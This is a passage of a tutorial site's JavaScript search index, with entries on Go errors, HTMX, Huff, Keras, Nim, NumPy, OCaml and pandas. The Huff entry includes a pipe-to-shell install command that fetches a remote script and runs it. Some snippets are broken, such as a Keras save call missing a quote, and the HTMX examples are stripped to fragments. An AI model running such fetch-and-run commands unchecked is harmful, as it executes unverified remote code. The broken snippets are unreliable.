continue refining your Go error handling strategies to enhance application reliability and maintainability.\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: Should I use panic for normal error handling in my application? A: No, panic is intended for unexpected errors and should generally be reserved for serious issues that are not intended to be recovered within the normal flow of an application.\nQ: How can I ensure that my custom errors provide enough information for debugging? A: Custom errors should implement the error interface effectively, often by including context such as what operation failed and why. This may involve storing additional fields on the error type.\n"
            }
        );
    index.add(
            {
                id:  27 ,
                href: "\/tutorials\/docs\/htmx\/htmx\/ajax_in_htmx\/",
                title: "AJAX in HTMX",
                description: "Learn about what HTMX is and how you can use it.",
                content: "The core of htmx is a set of attributes that allow you to issue AJAX requests directly from HTML:\nAttribute Description hx-get Issues a GET request to the given URL hx-post Issues a POST request to the given URL hx-put Issues a PUT request to the given URL hx-patch Issues a PATCH request to the given URL hx-delete Issues a DELETE request to the given URL Each of these attributes takes a URL to issue an AJAX request to. The element will issue a request of the specified type to the given URL when the element is triggered:\nPut To Messages This tells the browser:\nWhen a user clicks on this div, issue a PUT request to the URL /messages and load the response into the div.\nTriggers linkTriggering Requests linkBy default, AJAX requests are triggered by the “natural” event of an element:\ninput, textarea \u0026 select are triggered on the change event form is triggered on the submit event everything else is triggered by the click event If you want different behavior you can use the hx-trigger attribute to specify which event will cause the request.\nHere is a div that posts to /mouse_entered when a mouse enters it:\n[Here Mouse, Mouse!] Trigger Modifiers linkA trigger can also have a few additional modifiers that change its behavior. For example, if you want a request to only happen once, you can use the once modifier for the trigger:\n[Here Mouse, Mouse!] Other modifiers you can use for triggers are:\nchanged - only issue a request if the value of the element has changed delay: - wait the given amount of time (e.g. 1s) before issuing the request. If the event triggers again, the countdown is reset. throttle: - wait the given amount of time (e.g. 1s) before issuing the request. Unlike delay if a new event occurs before the time limit is hit the event will be discarded, so the request will trigger at the end of the time period. from: - listen for the event on a different element. This can be used for things like keyboard shortcuts. You can use these attributes to implement many common UX patterns, such as Active Search:\nThis input will issue a request 500 milliseconds after a key up event if the input has been changed and inserts the results into the div with the id search-results. Multiple triggers can be specified in the hx-trigger attribute, separated by commas.\nTrigger Filters linkYou may also apply trigger filters by using square brackets after the event name, enclosing a javascript expression that will be evaluated. If the expression evaluates to true the event will trigger, otherwise it will not.\nHere is an example that triggers only on a Control-Click of the element\nControl Click Me Properties like ctrlKey will be resolved against the triggering event first, then the global scope. The this symbol will be set to the current element.\nSpecial Events linkhtmx provides a few special events for use in hx-trigger:\nload - fires once when the element is first loaded revealed - fires once when an element first scrolls into the viewport intersect - fires once when an element first intersects the viewport. This supports two additional options: root: - a CSS selector of the root element for intersection threshold: - a floating point number between 0.0 and 1.0, indicating what amount of intersection to fire the event on You can also use custom events to trigger requests if you have an advanced use case. Polling linkIf you want an element to poll the given URL rather than wait for an event, you can use the every syntax with the hx-trigger attribute:\nThis tells htmx\nEvery 2 seconds, issue a GET to /news and load the response into the div\nIf you want to stop polling from a server response you can respond with the HTTP response code 286 and the element will cancel the polling.\nLoad Polling linkAnother technique that can be used to achieve polling in htmx is “load polling”, where an element specifies a load trigger along with a delay, and replaces itself with the response:\nIf the /messages end point keeps returning a div set up this way, it will keep “polling” back to the URL every second.\nLoad polling can be useful in situations where a poll has an end point at which point the polling terminates, such as when you are showing the user a progress bar.\nIndicators linkRequest Indicators linkWhen an AJAX request is issued it is often good to let the user know that something is happening since the browser will not give them any feedback. You can accomplish this in htmx by using htmx-indicator class.\nThe htmx-indicator class is defined so that the opacity of any element with this class is 0 by default, making it invisible but present in the DOM.\nWhen htmx issues a request, it will put a htmx-request class onto an element (either the requesting element or another element, if specified). The htmx-request class will cause a child element with the htmx-indicator class on it to transition to an opacity of 1, showing the indicator.\nClick Me! Here we have a button. When it is clicked the htmx-request class will be added to it, which will reveal the spinner gif element. (I like SVG spinners these days.)\nWhile the htmx-indicator class uses opacity to hide and show the progress indicator, if you would prefer another mechanism you can create your own CSS transition like so:\n.htmx-indicator{ display:none; } .htmx-request .htmx-indicator{ display:inline; } .htmx-request.htmx-indicator{ display:inline; } If you want the htmx-request class added to a different element, you can use the hx-indicator attribute with a CSS selector to do so:\nClick Me! Here we call out the indicator explicitly by id. Note that we could have placed the class on the parent div as well and had the same effect.\nYou can also add the the disabled attribute to elements for the duration of a request by using the hx-disabled-elt attribute.\nTargets linkIf you want the response to be loaded into a different element other than the one that made the request, you can use the hx-target attribute, which takes a CSS selector. Looking back at our Live Search example:\nYou can see that the results from the search are going to be loaded into div#search-results, rather than into the input tag.\nExtended CSS Selectors linkhx-target, and most attributes that take a CSS selector, support an “extended” CSS syntax:\nYou can use the this keyword, which indicates that the element that the hx-target attribute is on is the target The closest syntax will find the closest ancestor element or itself, that matches the given CSS selector. (e.g. closest tr will target the closest table row to the element) The next syntax will find the next element in the DOM matching the given CSS selector. The previous syntax will find the previous element in the DOM the given CSS selector. find which will find the first child descendant element that matches the given CSS selector. (e.g find tr would target the first child descendant row to the element) In addition, a CSS selector may be wrapped in \u003c and /\u003e characters, mimicking the query literal syntax of hyperscript. Relative targets like this can be useful for creating flexible user interfaces without peppering your DOM with loads of id attributes.\nSynchronization linkOften you want to coordinate the requests between two elements. For example, you may want a request from one element to supersede the request of another element, or to wait until the other element’s request has finished.\nhtmx offers a hx-sync attribute to help you accomplish this.\nConsider a race condition between a form submission and an individual input’s validation request in this HTML:\nSubmit Without using hx-sync, filling out the input and immediately submitting the form triggers two parallel requests to /validate and /store.\nUsing hx-sync=“closest form:abort” on the input will watch for requests on the form and abort the input’s request if a form request is present or starts while the input request is in flight:\nSubmit This resolves the synchronization between the two elements in a declarative way.\nhtmx also supports a programmatic way to cancel requests: you can send the htmx:abort event to an element to cancel any in-flight requests:\nIssue Request Cancel Request Click to Edit linkThe click to edit pattern provides a way to offer inline editing of all or part of a record without a page refresh.\nThis pattern starts with a UI that shows the details of a contact. The div has a button that will get the editing UI for the contact from /contact/1/edit First Name: Joe Last Name: Blow Email: joe@blow.com Click To Edit This returns a form that can be used to edit the contact\nFirst Name Last Name Email Address Submit Cancel Click to Load linkThis example shows how to implement click-to-load the next page in a table of data. The crux of the demo is the final row:\nLoad More Agents... This row contains a button that will replace the entire row with the next page of results (which will contain a button to load the next page of results). And so on.\nDelete Row linkThis example shows how to implement a delete button that removes a table row upon completion\n:\nFirst Last Joe Blow Delete Fred Smith Delete Bill Thompson Delete Confirm Before Sending linkThis example shows how to implement a confirmation dialogue before making a request. The trick here is to use the confirm trigger modifier:\nDelete Widget "
            }
        );
    index.add(
            {
                id:  28 ,
                href: "\/tutorials\/docs\/huff\/huff\/introduction_to_huff\/",
                title: "An Introduction to Huff",
                description: "Huff is a domain-specific, low-level programming language designed explicitly for writing smart contracts on the Ethereum blockchain.",
                content: "Introduction to Huff linkThe world of blockchain technology and Ethereum, in particular, has revolutionized how we think about digital transactions and smart contract programming. Ethereum, known for its robust and secure platform, allows developers to create decentralized applications (dApps) using smart contracts. These contracts are self-executing agreements with the terms of the agreement directly written into lines of code.\nAt the forefront of Ethereum’s smart contract development languages is Solidity, widely recognized and used for its accessibility and security features. However, there exists another language, lesser-known but equally potent in the realm of Ethereum development - Huff. Huff is a low-level language that provides developers with granular control over the bytecode of their smart contracts. This control allows for a level of optimization and efficiency that is sometimes not achievable with higher-level languages like Solidity.\nThe significance of Huff lies in its ability to cater to specific needs that require a more meticulous approach to smart contract development. By offering direct access to the Ethereum Virtual Machine (EVM) bytecode, Huff enables developers to write extremely gas-efficient code, an essential consideration in the Ethereum ecosystem where every transaction costs real money in the form of gas fees. It’s particularly advantageous for creating complex contracts where every byte of code can have significant cost implications.\nHuff is not just an alternative to Solidity; it’s a complementary tool that opens up new possibilities in smart contract programming. Its use is particularly appealing to those who wish to delve deeper into the intricacies of the Ethereum blockchain and understand how things work at a more fundamental level. For developers who are beginning their journey or those at an intermediate level, understanding and utilizing Huff can provide a valuable perspective on the workings of smart contracts and the Ethereum blockchain.\nWhat is Huff? linkHuff is a domain-specific, low-level programming language designed explicitly for writing smart contracts on the Ethereum blockchain. Unlike Solidity, which is high-level and abstracts many lower-level operations, Huff allows developers to interact directly with the Ethereum Virtual Machine (EVM) at a much more fundamental level. It is akin to assembly language in traditional programming, offering a minimalist syntax that translates almost directly into EVM bytecode. This direct translation facilitates a deeper understanding of the EVM and enables developers to write highly optimized code.\nKey Features of Huff link Direct Control over Bytecode: Huff provides unparalleled control over the bytecode generation process, allowing developers to optimize their contracts for gas efficiency and performance. Minimalist and Flexible Syntax: With its straightforward syntax, Huff makes it easier for developers to understand and manipulate EVM opcodes directly. Macro System: One of Huff’s unique features is its powerful macro system, enabling reusable code and complex logic implementation without the overhead typical of higher-level languages. Gas Efficiency: Since Huff allows for granular control over the contract’s bytecode, it is possible to write more gas-efficient contracts compared to Solidity. Comparison with Solidity: Why Choose Huff? linkWhile Solidity is an excellent language for most smart contract development needs, there are specific scenarios where Huff shines. Huff is particularly well-suited for creating highly optimized contracts where every bit of gas usage matters. This optimization is crucial in complex contracts, such as those used in decentralized finance (DeFi) applications, where efficiency directly correlates to user costs.\nMoreover, developers who use Huff gain a deeper understanding of how Ethereum smart contracts work at the bytecode level, which can be invaluable for debugging and optimizing contracts written in higher-level languages like Solidity. This understanding allows for a more comprehensive grasp of smart contract security, a crucial aspect of blockchain development.\nSetting up the Environment linkTools and Prerequisites for Huff Development linkBefore diving into Huff development, it’s essential to have the right tools and environment set up. Here’s a list of prerequisites and tools you’ll need:\nEthereum Node: An Ethereum node (like Geth or Infura) is required to deploy and interact with contracts on the Ethereum network. Node.js and NPM: These are necessary for running scripts and managing dependencies. Huff Compiler: The Huff compiler is crucial for compiling Huff code into EVM bytecode. It can be installed via NPM. Text Editor: A text editor like Visual Studio Code, with support for Huff syntax highlighting, can be helpful. Truffle or Hardhat: These development frameworks provide testing environments and are useful for deploying and interacting with your contracts. Step-by-step Guide to Set Up a Huff Development Environment linkFirst, install huffup, a version control manager for the Huff Compiler:\ncurl -L get.huff.sh | bash NOTE: This installs the huffup binary, but does not guarantee it is added to your path. If you get an error like huffup: command not found, you will need to source your path by running source ~/.bashrc or source ~/.zshrc. Alternatively, you can open a new terminal window.\nNow, with huffup installed and in your path, you can simply run huffup to install the latest stable version of huffc (the huff compiler).\nTo verify for yourself that it’s installed, run huffc –help to view the help menu.\n"
            }
        );
    index.add(
            {
                id:  29 ,
                href: "\/tutorials\/docs\/keras\/keras\/introduction_to_keras\/",
                title: "An Introduction to keras",
                description: "...",
                content: "Keras is an open source deep learning framework for python. It has been developed by an artificial intelligence researcher at Google named Francois Chollet. Leading organizations like Google, Square, Netflix, Huawei and Uber are currently using Keras. This tutorial walks through the installation of Keras, basics of deep learning, Keras models, Keras layers, Keras modules and finally conclude with some real-time applications.\nOverview of Keras linkKeras runs on top of open source machine libraries like TensorFlow, Theano or Cognitive Toolkit (CNTK). Theano is a python library used for fast numerical computation tasks. TensorFlow is the most famous symbolic math library used for creating neural networks and deep learning models. TensorFlow is very flexible and the primary benefit is distributed computing. CNTK is deep learning framework developed by Microsoft. It uses libraries such as Python, C#, C++ or standalone machine learning toolkits. Theano and TensorFlow are very powerful libraries but difficult to understand for creating neural networks.\nKeras is based on minimal structure that provides a clean and easy way to create deep learning models based on TensorFlow or Theano. Keras is designed to quickly define deep learning models. Well, Keras is an optimal choice for deep learning applications.\nFeatures linkKeras leverages various optimization techniques to make high level neural network API easier and more performant. It supports the following features −\nConsistent, simple and extensible API. Minimal structure - easy to achieve the result without any frills. It supports multiple platforms and backends. It is user friendly framework which runs on both CPU and GPU. Highly scalability of computation. Benefits linkKeras is highly powerful and dynamic framework and comes up with the following advantages −\nLarger community support. Easy to test. Keras neural networks are written in Python which makes things simpler. Keras supports both convolution and recurrent networks. Deep learning models are discrete components, so that, you can combine into many ways. Setup linkWe’re going to be using the JAX backend here – but you can edit the string below to “tensorflow” or “torch” and hit “Restart runtime”, and the whole notebook will run just the same! This entire guide is backend-agnostic.\nimport numpy as np import os os.environ[\"KERAS_BACKEND\"] = \"jax\" # Note that Keras should only be imported after the backend # has been configured. The backend cannot be changed once the # package is imported. import keras First example using Keras linkLet’s start with the Hello World of ML: training a convnet to classify MNIST digits.\nHere’s the data:\n# Load the data and split it between train and test sets (x_train, y_train), (x_test, y_test) = keras.datasets.mnist.load_data() # Scale images to the [0, 1] range x_train = x_train.astype(\"float32\") / 255 x_test = x_test.astype(\"float32\") / 255 # Make sure images have shape (28, 28, 1) x_train = np.expand_dims(x_train, -1) x_test = np.expand_dims(x_test, -1) print(\"x_train shape:\", x_train.shape) print(\"y_train shape:\", y_train.shape) print(x_train.shape[0], \"train samples\") print(x_test.shape[0], \"test samples\") Output:\nx_train shape: (60000, 28, 28, 1) y_train shape: (60000,) 60000 train samples 10000 test samples Here is our model: Different model-building options that Keras offers include:\nThe Sequential API The Funcitonal API Writing your own models via subclassing # Model parameters num_classes = 10 input_shape = (28, 28, 1) model = keras.Sequential( [ keras.layers.Input(shape=input_shape), keras.layers.Conv2D(64, kernel_size=(3, 3), activation=\"relu\"), keras.layers.Conv2D(64, kernel_size=(3, 3), activation=\"relu\"), keras.layers.MaxPooling2D(pool_size=(2, 2)), keras.layers.Conv2D(128, kernel_size=(3, 3), activation=\"relu\"), keras.layers.Conv2D(128, kernel_size=(3, 3), activation=\"relu\"), keras.layers.GlobalAveragePooling2D(), keras.layers.Dropout(0.5), keras.layers.Dense(num_classes, activation=\"softmax\"), ] ) We use the compile() method to specify the optimizer, loss function, and the metrics to monitor. Note that with the JAX and TensorFlow backends, XLA compilation is turned on by default.\nmodel.compile( loss=keras.losses.SparseCategoricalCrossentropy(), optimizer=keras.optimizers.Adam(learning_rate=1e-3), metrics=[ keras.metrics.SparseCategoricalAccuracy(name=\"acc\"), ], ) Let’s train and evaluate the model. We’ll set aside a validation split of 15% of the data during training to monitor generalization on unseen data.\nbatch_size = 128 epochs = 20 callbacks = [ keras.callbacks.ModelCheckpoint(filepath=\"model_at_epoch_{epoch}.keras\"), keras.callbacks.EarlyStopping(monitor=\"val_loss\", patience=2), ] model.fit( x_train, y_train, batch_size=batch_size, epochs=epochs, validation_split=0.15, callbacks=callbacks, ) score = model.evaluate(x_test, y_test, verbose=0) During training, we were saving a model at the end of each epoch. You can also save the model in its latest state and reload it like this:\nmodel.save(\"final_model.keras) model = keras.saving.load_model(\"final_model.keras\") Next, you can query predictions of class probabilities with predict():\npredictions = model.predict(x_test) That’s the basics for now.\n"
            }
        );
    index.add(
            {
                id:  30 ,
                href: "\/tutorials\/docs\/nim\/nim\/nim\/",
                title: "An Introduction to Nim",
                description: "Nim Lang description",
                content: "Nim is a relatively new programming language which allows users to write easy-to-read high-performance code.\nInstallation • Nim has ready made distributions for all three major operating systems and there are several options when it comes to installing Nim.\n• You can follow the official installation procedure to install the latest stable version.\n• If you’re using Linux, there is a high probability that your distribution has Nim in the package manager. If you are installing it that way, make sure it’s the most recent version.\nTesting the installing linkTo check if the installation was successful, we will write a program which is traditionally used as an introductory example: Hello World.\nIn a new text file called e.g. helloworld.nim we need to write just one line of code:\necho \"Hello World!\" First we need to compile our program, and then run it to see if it works as expected. Open your terminal in the same directory where your file is (on Linux you can get “Open Terminal here” if you right-click the directory in your file manager, on Windows you should use Shift + right-click to get the menu option for opening the command line).\nWe compile our program by typing in the terminal:\nnim c helloworld.nim After a successful compilation, we can run our program. On Linux we can run our program by typing ./helloworld in the terminal, and on Windows we do it by typing helloworld.exe. There is also a possibility to both compile and run the program with just one command. We need to type:\nnim c -r helloworld.nim If you’re using VSCode with the Code Runner extension mentioned before, you’ll just have to press Ctrl+Alt+N and your file will be compiled and run.\nWhichever way you chose to run your program, after a brief moment in the output window (or in your terminal) you should see: Hello World!.\nVariable declaretion linkNim is a statically typed programming language, meaning that the type of an assignment needs to be declared before using the value.\nIn Nim we also distinguish values that can change, or mutate, from those that can’t, but more on this later. We can declare a variable (a mutable assignment) using the var keyword, just by stating its name and type (the value can be added later) by using this syntax:\nvar : If we already know its value, we can declare a variable and give it a value immediately:\nvar : = We can assign a variable without an explicit type like this:\nvar = An example of this in Nim looks like this:\nvar a: int var b = 7 As previously mentioned variables are mutable, i.e. their value can change (multiple times), but their type must stay the same as declared.\nvar f = 7 f = -3 f = 19 f = \"Hello\" # error Immutable assignment linkUnlike variables declared with var keyword, two more types of assignment exist in Nim, whose value cannot change, one declared with the const keyword, and the other declared with the let keyword.\nConst\nThe value of an immutable assignment declared with const keyword must be known at compile time (before the program is run). For example, we can declare the acceleration of gravity as const g = 9.81 or pi as const pi = 3.14, as we know their values in advance and these values will not change during the execution of our program.\nconst g = 35 g = -27 # error var h = -5 const i = h + 7 # error In some programming languages it is a common practice to have the names of constants written in ALL_CAPS. Constants in Nim are written just like any other variable.\nLet\nImmutable assignments declared with let don’t need to be known at compile time, their value can be set at any time during the execution of a program, but once it is set, their value cannot change.\nlet j = 35 j = -27 # error var k = -5 let l = k + 7 In practice, you will see/use let more frequently than const. While you could use var for everything, your default choice should be let. Use var only for the variables which will be modified.\n"
            }
        );
    index.add(
            {
                id:  31 ,
                href: "\/tutorials\/docs\/numpy\/numpy\/introduction_to_numpy\/",
                title: "An Introduction to NumPy",
                description: "...",
                content: "NumPy, short for Numerical Python, is a fundamental package for scientific computing in Python. It provides support for large multidimensional arrays and matrices, along with a collection of mathematical functions to operate on these arrays. NumPy is the foundation upon which many other scientific Python libraries are built, making it an essential tool for data manipulation, numerical computing, and machine learning.\nKey Features link1. Multidimensional Arrays linkAt the core of NumPy is its ndarray (n-dimensional array) object, which represents a multidimensional array of elements of the same type. These arrays can be of any dimensionality and are highly efficient for storing and manipulating large datasets. NumPy’s arrays are homogeneous, meaning all elements in an array must be of the same data type, leading to efficient memory usage and optimized performance.\n2. Universal Functions (ufuncs) linkNumPy provides a comprehensive set of mathematical functions that operate element-wise on arrays, known as universal functions or ufuncs. These functions are vectorized, meaning they can efficiently process entire arrays without the need for explicit looping, leading to faster computations. Ufuncs allow for concise and expressive code and are optimized for performance.\n3. Broadcasting linkBroadcasting is a powerful mechanism in NumPy that allows arithmetic operations to be performed on arrays of different shapes. When operating on arrays with different shapes, NumPy automatically broadcasts the smaller array to match the shape of the larger array, enabling element-wise operations without unnecessary copying of data. Broadcasting rules in NumPy allow for efficient and intuitive manipulation of arrays with different dimensions, facilitating complex computations.\n4. Linear Algebra Operations linkNumPy includes a rich set of functions for linear algebra operations, such as matrix multiplication, decomposition, eigenvalue calculation, and solving linear equations. These functions make it easy to perform complex mathematical operations common in scientific computing and machine learning. NumPy’s linear algebra capabilities are essential for tasks like regression analysis, signal processing, and image processing.\n5. Random Number Generation linkNumPy provides tools for generating random numbers from various probability distributions. This functionality is crucial for tasks like simulation, statistical analysis, and random sampling. NumPy’s random number generation capabilities are highly customizable, allowing users to control the properties of random numbers generated, such as the distribution, shape, and seed.\n6. Integration with C/C++ linkNumPy is implemented in C and Python, making it highly efficient for numerical computations. It seamlessly integrates with code written in C/C++, allowing for the optimization of performance-critical sections of code. NumPy’s C-based implementation ensures fast execution of numerical algorithms, making it suitable for large-scale scientific computing tasks.\nInstallation linkNumPy can be installed using Python’s package manager, pip. Simply run the following command in your terminal:\npip install numpy Getting Started linkAfter installing NumPy, you can start using it in your Python scripts or interactive sessions. The first step is to import the NumPy library:\nimport numpy as np This statement imports the NumPy library and assigns it the alias np, which is a common convention used by the Python community.\nList of useful NumPy functions linkNumPy has numerous useful functions. You can see the full list of functions in the NumPy docs. As an overview, here are some of the most popular and useful ones to give you a sense of what NumPy can do. We will cover many of them in this tutorial.\nArray Creation: arange, array, copy, empty, empty_like, eye, fromfile, fromfunction, identity, linspace, logspace, mgrid, ogrid, ones, ones_like, r_, zeros, zeros_like Conversions: ndarray.astype, atleast_1d, atleast_2d, atleast_3d, mat Manipulations: array_split, column_stack, concatenate, diagonal, dsplit, dstack, hsplit, hstack, ndarray.item, newaxis, ravel, repeat, reshape, resize, squeeze, swapaxes, take, transpose, vsplit, vstack Questions: all, any, nonzero, where Ordering: argmax, argmin, argsort, max, min, ptp, searchsorted, sort Operations: choose, compress, cumprod, cumsum, inner, ndarray.fill, imag, prod, put, putmask, real, sum Basic Statistics: cov, mean, std, var Basic Linear Algebra: cross, dot, outer, linalg.svd, vdot Example Usage linkLet’s explore a more detailed example demonstrating some of NumPy’s basic functionality. Suppose we want to analyze the performance of a car over a period of time. We collect data on the car’s speed (in km/h) at various time intervals (in hours). We can represent this data using NumPy arrays and perform calculations on it.\nimport numpy as np # Time intervals (in hours) time = np.array([0, 1, 2, 3, 4, 5]) # Speed data (in km/h) speed = np.array([0, 30, 45, 60, 55, 50]) # Calculate distance traveled using the trapezoidal rule distance_traveled = np.trapz(speed, time) print(\"Total distance traveled:\", distance_traveled, \"km\") In this example, we create NumPy arrays time and speed to represent the time intervals and corresponding speed data. We then use NumPy’s trapz function to calculate the distance traveled by the car over the given time intervals using the trapezoidal rule. Finally, we print the total distance traveled by the car.\nConclusion linkNumPy is an essential library for numerical computing in Python, offering powerful tools for working with large datasets, performing mathematical operations, and conducting scientific research. Its efficiency, flexibility, and ease of use make it the go-to choice for scientists, engineers, and data analysts alike. Whether you’re performing simple calculations or tackling complex computational tasks, NumPy provides the tools you need to get the job done efficiently and effectively.\n"
            }
        );
    index.add(
            {
                id:  32 ,
                href: "\/tutorials\/docs\/ocaml\/ocaml\/introduction_to_ocaml\/",
                title: "An Introduction to OCaml: A Versatile Programming Language",
                description: "Master functional, imperative, and object-oriented programming with OCaml, a powerful and secure language.",
                content: "Introduction to OCaml linkOCaml (originally Objective Caml) is a versatile, general-purpose, multi-paradigm programming language. It seamlessly blends functional, imperative, and object-oriented programming styles, empowering developers to choose the most suitable approach for different tasks. Developed in the mid-1990s by INRIA, the French National Institute for Research in Computer Science and Control, OCaml offers exceptional reliability and security, making it ideal for mission-critical systems.\nKey Strengths of OCaml: link Robust Static Typing: OCaml enforces strong static typing, where types are explicitly declared or inferred by the compiler. This rigorous approach catches errors at compile time, significantly reducing runtime issues and enhancing code maintainability. Effortless Type Inference: OCaml’s type inference capability automatically deduces types based on variable assignments and function expressions. This reduces boilerplate code and simplifies development. Functional Programming Paradigm: OCaml excels in functional programming, which emphasizes immutability and pure functions. This style promotes cleaner code, easier reasoning about program behavior, and improved testability. Imperative Features for Flexibility: While OCaml prioritizes functional programming, it also accommodates imperative programming constructs like loops and mutable state when necessary. This flexibility provides developers with a broader range of tools for various programming tasks. Extensive Standard Library and Community Support: OCaml boasts a rich standard library brimming with modules for common operations like file I/O, networking, and string manipulation. It also benefits from a thriving community that contributes a wealth of third-party libraries, expanding its capabilities. Getting Started with OCaml Development linkInstallation and Environment Setup linkTo embark on your OCaml journey, you’ll need to set up your development environment. The installation process varies slightly depending on your operating system.\nWindows: Download and install the OCaml for Windows installer, which includes the compiler, debugger, and an IDE (Integrated Development Environment). macOS: Utilize Homebrew, a popular package manager, by running the command brew install ocaml in your terminal. Linux: Most Linux distributions provide OCaml packages in their repositories. For example, on Ubuntu or Debian-based systems, use sudo apt install ocaml. Once installed, verify the setup by running ocaml -version in your terminal.\nBasic Syntax in a Nutshell linkOCaml’s syntax might appear unique if you’re accustomed to other languages. Here’s a quick breakdown:\nComments: Lines starting with (* and ending with *) are treated as comments. Variable Declaration: Variables are declared using the let keyword followed by the variable name, an optional type annotation, and the assigned value. For example: let age = 30; (type is inferred as integer) or let name: string = \"Alice\"; (explicit type declaration). Function Definition: Functions are defined using the let keyword followed by the function name, parameters enclosed in parentheses, an optional return type annotation, and the function body. Here’s an example: let add x y = x + y; (returns an integer). Static Typing: OCaml enforces static typing, ensuring type compatibility between expressions and variables. Hello, World! in OCaml linkThe “Hello, World!” program serves as a customary introduction to any programming language. Here’s how it’s written in OCaml:\nprint_endline \"Hello, world!\";; This line utilizes the print_endline function to display “Hello, world!” followed by a newline character on the console. The double semicolon (;;) signifies the end of a top-level expression in OCaml.\nBest Practices for Effective OCaml Development linkFollowing best practices empowers you to write clean, maintainable, and performant OCaml code:\nModular Organization: Structure your code into well-defined modules using the module keyword. This promotes code reusability and improves project organization. Meaningful Naming: Employ descriptive names for variables, functions, and modules to enhance code readability and maintainability. Strategic Use of Comments: Add comments to explain complex logic or non-obvious sections of code. However, avoid over-commenting well-structured code. Performance Optimization: Be mindful of recursive function calls and leverage tail recursion to prevent stack overflows "
            }
        );
    index.add(
            {
                id:  33 ,
                href: "\/tutorials\/docs\/pandas\/pandas\/intro_to_pandas\/",
                title: "An Introduction to Pandas",
                description: "This is an introduction to pandas, a python package for data analysis.",
                content: "pandas is arguably the most important Python package for data analysis. It is the de facto standard package for data manipulation and exploratory data analysis. Its ability to read from and write to an extensive list of formats makes it a versatile tool for data science practitioners. Its data manipulation functions make it a highly accessible and practical tool for aggregating, analyzing, and cleaning data.\nIn this introduction on how to learn pandas, we discussed the learning path you may take to master this package. This beginner-friendly tutorial will cover all the basic concepts and illustrate pandas’ different functions. You can also check out our course on pandas Foundations for further details.\nThis article is aimed at beginners with basic knowledge of Python and no prior experience with pandas to help you get started.\nWhat is pandas? linkpandas is a data manipulation package in Python for tabular data. That is, data in the form of rows and columns, also known as DataFrames. Intuitively, you can think of a DataFrame as an Excel sheet.\npandas’ functionality includes data transformations, like sorting rows and taking subsets, to calculating summary statistics such as the mean, reshaping DataFrames, and joining DataFrames together.\nUses for pandas linkpandas is used throughout the data analysis workflow. With pandas, you can:\nImport datasets from databases, spreadsheets, comma-separated values (CSV) files, and more. Clean datasets, for example, by dealing with missing values. Tidy datasets by reshaping their structure into a suitable format for analysis. Aggregate data by calculating summary statistics such as the mean of columns, correlation between them, and more. Visualize datasets and uncover insights. Key benefits of the pandas package linkUndoubtedly, pandas is a powerful data manipulation tool packaged with several benefits, including:\nMade for Python: Python is the world’s most popular language for machine learning and data science. Less verbose per unit operations: Code written in pandas is less verbose, requiring fewer lines of code to get the desired output. Intuitive view of data: pandas offers exceptionally intuitive data representation that facilitates easier data understanding and analysis. Extensive feature set: It supports an extensive set of operations from exploratory data analysis, dealing with missing values, calculating statistics, visualizing univariate and bivariate data, and much more. Works with large data: pandas handles large data sets with ease. It offers speed and efficiency while working with datasets of the order of millions of records and hundreds of columns, depending on the machine. Installations linkInstalling pandas is clear: we are going to be using pip to install pandas, either on your terminal, notebook or google colab.\npip install pandas Working with pandas linkImporting data in pandas Firstly import the pandas Python package as shown below. When importing pandas, the most common alias for pandas is pd:\nimport pandas as pd Importing CSV files Use read_csv() with the path to the CSV file to read a comma-separated values file.\nimport pandas as pd df = pd.read_csv(\"movies.csv\") Importing Text Files\nReading text files is similar to reading CSV files. The only nuance is that you need to specify a separator with the sep argument, as shown below. The sep argument refers to the symbol used to separate rows in a DataFrame. Common separators include comma (sep=\",\"), whitespace (sep=\"\\s\"), tab (sep=\"\\t\"), and colon (sep=\":\"). Here, \\s represents a single whitespace character.\ndf = pd.read_csv(\"movies.txt\", sep=\"\\s\") Importing Excel Files (Single Sheet)\nReading Excel files (both XLS and XLSX) is as easy as using the read_excel() function, with the file path as an input.\ndf = pd.read_excel('movies.xlsx') You can also specify other arguments, such as header to specify which row becomes the DataFrame’s header. The default value is 0, which denotes the first row as headers or column names. You can also specify column names as a list in the names argument. The index_col (default is None) argument can be used if the file contains a row index.\nNote: In a pandas DataFrame or Series, the index is an identifier that points to the location of a row or column in a pandas DataFrame. The index labels the row or column and lets you access a specific row or column by using its index. A DataFrame’s row index can be a range (e.g., 0 to 303), a time series (dates or timestamps), a unique identifier (e.g., movie_ID in a movies table), or other types of data. For columns, it’s usually a string (denoting the column name).\nImporting Excel Files (Multiple Sheets)\nReading Excel files with multiple sheets is not much different. You just need to specify one additional argument, sheet_name, where you can either pass a string for the sheet name or an integer for the sheet position (note that Python uses 0-indexing, where the first sheet can be accessed with sheet_name=0).\n# Extracting the second sheet since Python uses 0-indexing df = pd.read_excel('movies_multi.xlsx', sheet_name=1) Importing JSON Files\nSimilar to the read_csv() function, you can use read_json() for JSON file types with the JSON file name as the argument. The below code reads a JSON file from disk and creates a DataFrame object df.\ndf = pd.read_json(\"movies.json\") If you want to learn more about importing data with pandas, check out this cheat sheet on importing various file types with Python.\n```markdown ### Outputting Data in Pandas Just as pandas can import data from various file types, it also allows you to export data into various formats. This is useful when data is transformed using pandas and needs to be saved locally on your machine. Below is how to output pandas DataFrames into various formats. #### Outputting a DataFrame into a CSV File A pandas DataFrame (here we are using `df`) is saved as a CSV file using the `.to_csv()` method. The arguments include the filename with path and `index` – where `index=True` implies writing the DataFrame’s index. ```python df.to_csv(\"movies_out.csv\", index=False) Outputting a DataFrame into a JSON File linkExport a DataFrame object into a JSON file by calling the .to_json() method.\ndf.to_json(\"movies_out.json\") Note: A JSON file stores a tabular object like a DataFrame as a key-value pair. Thus, you would observe repeating column headers in a JSON file.\nOutputting a DataFrame into a Text File linkAs with writing DataFrames to CSV files, you can call .to_csv(). The only differences are that the output file format is .txt, and you need to specify a separator using the sep argument.\ndf.to_csv('movies_out.txt', header=df.columns, index=None, sep=' ') Outputting a DataFrame into an Excel File linkCall .to_excel() from the DataFrame object to save it as a “.xls” or “.xlsx” file.\ndf.to_excel(\"movies_out.xlsx\", index=False) "
            }
        );
    index.add(
            {
                id:  34 ,
                href: "\/tutorials\/docs\/pytorch\/pytorch\/introduction_to_pytorch\/",
                title: "An Introduction to PyTorch",
                description: "A comprehensive introduction to PyTorch for deep learning.",
